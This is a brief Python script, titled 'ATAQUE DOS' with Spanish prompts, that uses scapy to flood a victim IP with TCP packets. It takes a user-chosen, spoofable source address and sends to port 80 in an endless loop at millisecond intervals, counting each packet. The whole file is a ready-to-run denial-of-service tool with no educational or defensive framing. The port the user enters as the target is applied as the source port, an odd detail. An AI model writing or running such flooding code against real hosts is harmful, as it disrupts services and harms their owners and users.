#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

                                ATAQUE DOS

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

from scapy.all import *

src = raw_input("Introduce la IP atacante: ")
victima = raw_input("Introduce la IP de la victima: ")
puerto = raw_input("Introduce el puerto a atacar: ")
numero_paquete = 1

while True:
    IP_ataque = IP(src=src,dst=victima)
    TCP_ataque = TCP(sport=int(puerto), dport=80)
    pkt = IP_ataque/TCP_ataque
    send(pkt,inter = .001)
    print ("Paquete enviado numero: ", numero_paquete)
    numero_paquete = numero_paquete + 1
